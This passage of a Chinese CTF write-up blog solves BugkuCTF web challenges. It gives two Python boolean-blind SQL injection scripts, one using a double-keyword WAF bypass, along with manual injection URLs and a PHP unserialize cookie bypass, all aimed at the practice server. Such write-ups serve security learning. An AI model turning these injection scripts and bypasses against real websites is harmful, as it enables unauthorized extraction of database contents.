<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd (ascii(substr((selselectect database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd (seselectlect ascii(substr((selselectect group_concat(table_name separatoorr &#39;:&#39;) from infoorrmation_schema.tables where table_schema&#x3D;database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd (seselectlect ascii(substr((seselectlect group_concat(column_name separatoorr &#39;:&#39;) from infoorrmation_schema.columns where table_name&#x3D;&#39;flag1&#39; anandd table_schema&#x3D;database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;1ndex.php?id&#x3D;1&#39; anandd (selselectect ascii(substr((selselectect group_concat(flag1,&#39;:&#39;,address separatoorr &#39;?&#39;) from flag1),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for  i  in range(1,100):</span><br><span class="line">    min &#x3D; 33</span><br><span class="line">    max &#x3D; 126</span><br><span class="line">    while min&lt;&#x3D;max:</span><br><span class="line">        mid &#x3D; (max + min)&#x2F;&#x2F;2</span><br><span class="line">        payload &#x3D; url.format(_&#x3D;i,__ &#x3D; mid)</span><br><span class="line">        r &#x3D; requests.get(payload)</span><br><span class="line">        if &#39;There is nothing.&#39; in r.text:</span><br><span class="line">            min &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            max &#x3D; mid-1</span><br><span class="line"></span><br><span class="line">    data +&#x3D; chr(min)</span><br><span class="line">    print(data)</span><br><span class="line">print(&quot;done&quot;)</span><br></pre></td></tr></table></figure>

<p>PS：此处的Waf可用双写关键字绕过</p>
<p>Run 数据库：</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521213113934-89161869.png" alt="img"></p>
<p>Run 表： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521221033871-2135942462.png" alt="img"></p>
<p>Run 字段： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521221501960-63612935.png" alt="img"></p>
<p>Run 字段 Value： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190521223033837-121184091.png" alt="img"></p>
<p>根据提示表flag1的flag1字段内容肯定不是真的flag，在表flag1的address字段中发现新的Hint </p>
<p>尝试访问./Once_More.php </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522213316638-1303662154.png" alt="img"></p>
<p>手动测试又一次发现存在布尔盲注</p>
<p>payload3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1%27%20and%201&#x3D;1--+</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1%27%20and%201&#x3D;2--+</span><br></pre></td></tr></table></figure>



<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522213638790-904357128.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522213756056-716569193.png" alt="img"></p>
<p>手动测试发现过滤了union、substr</p>
<p>测试过程的记录</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522214149292-726968912.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522214414628-2028266647.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522214515640-145578920.png" alt="img"></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522214553480-203963959.png" alt="img"></p>
<p>在上面的基础上编写新的POC2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and (ascii(mid((select database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and (select ascii(mid((select group_concat(table_name separator &#39;:&#39;) from information_schema.tables where table_schema&#x3D;database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and (select ascii(mid((select group_concat(column_name separator &#39;:&#39;) from information_schema.columns where table_name&#x3D;&#39;flag2&#39; and table_schema&#x3D;database()),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and (select ascii(mid((select group_concat(flag2,&#39;:&#39;,address separator &#39;?&#39;) from flag2),&#123;_&#125;,1))&gt;&#123;__&#125;) --+&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">for  i  in range(1,100):</span><br><span class="line">    min &#x3D; 33</span><br><span class="line">    max &#x3D; 126</span><br><span class="line">    while min&lt;&#x3D;max:</span><br><span class="line">        mid &#x3D; (max + min)&#x2F;&#x2F;2</span><br><span class="line">        payload &#x3D; url.format(_&#x3D;i,__ &#x3D; mid)</span><br><span class="line">        r &#x3D; requests.get(payload)</span><br><span class="line">        if &#39;Hello,I Am Here!&#39; in r.text:</span><br><span class="line">            min &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            max &#x3D; mid-1</span><br><span class="line"></span><br><span class="line">    data +&#x3D; chr(min)</span><br><span class="line">    print(data)</span><br><span class="line">print(&quot;done&quot;)</span><br></pre></td></tr></table></figure>

<p>PS：substr使用mid替换</p>
<p>Run 数据库： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522181119827-1681461442.png" alt="img"></p>
<p>Run 表： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522180923793-2120598065.png" alt="img"></p>
<p>Run 字段： </p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190522181658117-467320624.png" alt="img"></p>
<p>Run 字段 Value： </p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190522214935532-1861291728.png" alt="img"></p>
<p>更据提示 flag 为小写</p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bugku-sql_6s-2i-4t-bug&#125;</span><br></pre></td></tr></table></figure>





<p><strong>42. flag.php</strong></p>
<p>考点：代码审计、php反序列</p>
<p>地址：<a href="http://123.206.87.240:8002/flagphp/" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/</a></p>
<p> <img src="BugkuCTF~Web~WriteUp/1594459-20190216180814095-1910634386.png" alt="img"></p>
<p>点击login确实没反应，根据提示：hint 可能是一个变量，尝试访问 <a href="http://123.206.87.240:8002/flagphp/?hint=" target="_blank" rel="noopener">http://123.206.87.240:8002/flagphp/?hint=</a> 得到网页源码正常信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计发现需要满足：1. $cookie = $_COOKIE['ISecer']的值必须是经过序列化之后的值</p>
<p>   　　　　　　　　　　　2. unserialize($cookie) === "$KEY" //此处的$key==null</p>
<p>利用BurpSuite抓包在http请求头部添加cookie字段：ISecer=s:0:"";</p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190216182830290-972432164.png" alt="img"></p>
<p>get flag:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;unserialize_by_virink&#125;</span><br></pre></td></tr></table></figure>



<p><strong>48. flag.php</strong></p>
<p>考点：代码审计、php反序列、CBC字节反转攻击</p>
<p>地址：<a href="http://123.206.31.85:49168/" target="_blank" rel="noopener">http://123.206.31.85:49168/</a></p>
<p><img src="BugkuCTF~Web~WriteUp/1594459-20190326004727201-140640452.png" alt="img"></p>
<p>解题思路，请参考作者本篇文章：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CBC字节反转攻击 https:&#x2F;&#x2F;www.cnblogs.com&#x2F;qftm&#x2F;p&#x2F;10595591.html</span><br></pre></td></tr></table></figure>

<p>get flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SKCTF&#123;CBC_wEB_cryptography_6646dfgdg6&#125;</span><br></pre></td></tr></table></figure>





<p><strong>题目更新+ing</strong></p>
</script></p>
    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>Author：<a href="http://Qftm.github.io">Qftm</a>
            <p>原文链接：<a href="http://qftm.github.io/2019/02/16/BugkuCTF~Web~WriteUp/">http://qftm.github.io/2019/02/16/BugkuCTF~Web~WriteUp/</a>
            <p>发表日期：<a href="http://qftm.github.io/2019/02/16/BugkuCTF~Web~WriteUp/">February 16th 2019, 6:30:00 pm</a>
            <p>更新日期：<a href="http://qftm.github.io/2019/02/16/BugkuCTF~Web~WriteUp/">March 12th 2020, 9:37:00 am</a>
            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href= "/2019/02/28/CentOS7%E6%9C%80%E5%B0%8F%E5%8C%96%E5%AE%89%E8%A3%85%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE/" title= "CentOS 7 最小化安装简单配置">
                    <div class="nextTitle">CentOS 7 最小化安装简单配置</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href= "/2019/02/16/BugkuCTF~%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1~WriteUp/" title= "BugkuCTF 代码审计 WriteUp">
                    <div class="prevTitle">BugkuCTF 代码审计 WriteUp</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:Qftmbin@gmail.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="//github.com/Qftm" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
            
                <span class="iconfont-archer wechat" title=wechat>
                  
                  <img class="profile-qr" src="/assets/example_qr.png" />
                </span>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="//twitter.com/Qftmer" class="iconfont-archer twitter" target="_blank" title=twitter></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="//www.cnblogs.com/qftm/" class="iconfont-archer others" target="_blank" title=others></a>
            
        
    
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 77
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/03</span><a class="archive-post-title" href= "/2020/04/03/php-filter-tricks/" >探索php://filter在实战当中的奇技淫巧</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2020/03/25/Linux-Network-Protocol-Stack/" >Linux Network Protocol Stack</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2020/03/23/Software-Engineering-Learning-Handbook/" >Software Engineering Learning Handbook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2020/03/22/Socket-Learning-Handbook/" >Socket Programming Learning Handbook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/2020/03/18/PHP-File-Inclusion-Exploiting-and-Bypass/" >PHP File Inclusion Bug Exploiting and Bypass Handbook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/15</span><a class="archive-post-title" href= "/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/" >LFI PHPINFO OR PHP7 Segment Fault Getshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/" >LFI Bypass Session Restriction Getshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/10</span><a class="archive-post-title" href= "/2020/03/10/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E4%B9%8BLinux%E4%B8%8B%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/" >电子取证之Linux下文件恢复</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/06</span><a class="archive-post-title" href= "/2020/03/06/RFI%E5%B7%A7%E7%94%A8WebDAV%E7%BB%95%E8%BF%87URL%E5%8C%85%E5%90%AB%E9%99%90%E5%88%B6Getshell/" >RFI巧用WebDAV绕过URL包含限制Getshell</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2020/03/01/Apple-iCloud-%E5%87%AD%E8%AF%81%E7%9A%84%E7%AA%83%E5%8F%96/" >Apple iCloud 凭证的窃取分析 -【CVE-2020-3841】</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/2020/02/12/Hackintosh-Of-Lenovo-R720-15IKBN/" >Hackintosh Of Lenovo R720 15IKBN</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/18</span><a class="archive-post-title" href= "/2020/01/18/Information-Collection-Handbook/" >Information Collection Handbook</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/03</span><a class="archive-post-title" href= "/2020/01/03/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E7%BA%A7IPS%E9%83%A8%E7%BD%B2/" >中小型企业级 IPS 部署</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/2020/01/01/%E4%B8%AD%E5%B0%8F%E5%9E%8B%E4%BC%81%E4%B8%9A%E7%BA%A7%E9%98%B2%E7%81%AB%E5%A2%99%E9%83%A8%E7%BD%B2/" >中小型企业级防火墙部署</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/31</span><a class="archive-post-title" href= "/2019/12/31/Solve-Perl-Cant-locate-getopts/" >Solve Perl Can't locate getopts.pl</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2019/11/22/PhpStudyBackDoor2019%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" >PhpStudy BackDoor2019 深度分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/Kali-Rolling-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%80%BB%E7%BB%93(Updateing)/" >Kali Rolling 系统配置总结 (Updateing)</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/27</span><a class="archive-post-title" href= "/2019/10/27/%E6%A5%BC%E4%B8%8A%E8%AF%B7%E8%AE%A9%E8%B7%AF-RoarCTF2019-Writeup/" >楼上请让路 RoarCTF2019 Writeup</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2019/10/26/Joomla3.4.6-RCE%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" >Joomla3.4.6 RCE漏洞深度分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2019/09/30/%E5%88%9D%E8%AF%86PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/" >初识PE文件结构</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/2019%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E7%B1%BB%E5%B7%A5%E5%85%B7%E5%90%88%E9%9B%86/" >2019安全渗透类工具合集</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/%E5%9F%BA%E4%BA%8EBMP%E5%9B%BE%E5%83%8F%E7%9A%84%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/" >基于BMP图像的信息隐藏与检测</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/14</span><a class="archive-post-title" href= "/2019/09/14/MATLAB%E4%B9%8B%E5%9B%BE%E5%83%8F%E4%B8%8E%E9%9F%B3%E9%A2%91%E4%BF%A1%E5%8F%B7%E5%A4%84%E7%90%86/" >MATLAB之图像与音频信号处理</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2019/09/12/MATLAB%E4%B9%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8E%E5%9F%BA%E7%A1%80%E5%87%BD%E6%95%B0/" >MATLAB之基本语法与基础函数</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/CVE-2018-14418%E6%93%A6%E5%87%BA%E6%96%B0%E7%81%AB%E8%8A%B1/" >CVE-2018-14418 擦出新火花</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/%E6%B5%85%E8%B0%88%E7%94%B5%E5%AD%90%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81%E6%8A%80%E6%9C%AF/" >浅谈电子数字取证技术</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/03</span><a class="archive-post-title" href= "/2019/08/03/Linux%E5%8F%8D%E5%BC%B9Shell/" >Linux 反弹 Shell</a>
        </li>
    
    
        <li class="archive-post-item">
